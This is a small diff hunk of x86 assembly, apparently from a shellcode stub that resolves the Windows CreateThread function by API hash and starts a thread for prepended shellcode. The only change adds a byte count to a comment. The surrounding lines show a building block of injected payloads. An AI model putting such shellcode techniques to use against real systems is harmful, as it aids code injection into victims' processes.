@@ -19,7 +19,7 @@ start:
   push 0x160D6838 ; hash( "kernel32.dll", "CreateThread" )
   call ebp ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
   popa ; A
-  sub dword [esp],5	; length of original call
+  sub dword [esp],5	; length of original call (5 bytes)
   ret
 threadstart:
   pop eax ; pop off the unused thread param so the prepended shellcode can just return when done.
